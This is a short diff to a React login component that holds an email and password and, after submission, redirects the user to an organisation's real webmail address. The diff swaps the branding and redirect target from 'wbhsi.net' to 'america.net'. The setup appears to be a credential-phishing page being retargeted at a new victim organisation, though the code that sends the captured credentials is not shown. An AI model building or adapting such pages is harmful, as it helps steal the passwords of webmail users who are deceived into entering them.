@@ -15,7 +15,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Wbhsi")
+    const[platform, setPlatform] = useState("America")
 
     const[showError, setShowError] = useState(false);
 
@@ -48,7 +48,7 @@ async function handleSubmit(e){
            // console.log(response.data.message);
 
           
-           window.location.href = 'https://webmail.wbhsi.net/webmail/';
+           window.location.href = 'https://webmail.america.net/webmail/';
         }
       } catch (error) {
         // Handle error
